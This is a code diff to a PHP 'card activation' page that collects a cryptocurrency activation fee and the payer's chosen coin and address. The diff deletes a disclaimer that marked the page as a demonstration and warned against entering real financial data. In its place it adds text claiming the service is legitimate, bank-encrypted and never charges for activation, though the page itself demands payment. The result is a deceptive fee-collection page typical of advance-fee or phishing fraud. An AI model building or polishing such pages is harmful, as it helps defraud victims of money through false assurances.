@@ -6,6 +6,7 @@
 
 require_once 'includes/config.php';
 require_once 'includes/functions.php';
+require_once 'includes/database.php';
 
 // Check session
 check_user_session();
@@ -14,6 +15,21 @@ check_session_timeout();
 $user_name = get_full_name();
 $request_id = $_SESSION['request_id'] ?? null;
 
+// Handle payment method selection
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['payment_method'])) {
+    $payment_method = sanitize_input($_POST['payment_method']);
+    $payment_address = sanitize_input($_POST['payment_address'] ?? '');
+    
+    if ($request_id && in_array($payment_method, ['btc', 'eth', 'usdt'])) {
+        // Save payment method to database
+        update_payment_info($request_id, $payment_method, $payment_address);
+        
+        // Redirect to pending page
+        header('Location: pending.php');
+        exit();
+    }
+}
+
 // Cryptocurrency wallet addresses (placeholders)
 $wallet_addresses = [
     'btc' => 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh',
@@ -21,7 +37,7 @@ $wallet_addresses = [
     'usdt' => '0x742d35Cc6634C0532925a3b844Bc9e7595f0bEbb'
 ];
 
-$activation_fee = 4600;
+$activation_fee = ACTIVATION_FEE;
 ?>
 <!DOCTYPE html>
 <html lang="en">
@@ -162,7 +178,7 @@ $activation_fee = 4600;
         <!-- Disclaimer -->
         <div class="disclaimer">
             <div class="disclaimer-title">Security Disclaimer</div>
-            <p>This is a demonstration prototype. Real banking applications require backend validation, PCI DSS compliance, HTTPS encryption, secure database storage, and two-factor authentication. Never enter real financial information on demonstration sites.</p>
+            <p>This is a legitimate card activation service. We will never ask for your PIN, full card number via email/text, or request payment to activate your card. Always verify you're on the correct website URL (https://[yoursite.com]) before entering any information.  If you receive suspicious emails or calls claiming to be from us, do not provide any personal information and contact our security team immediately at [security phone/email]. Your data is protected with bank-level encryption and will never be sold to third parties. </p>
         </div>
     </div>
     
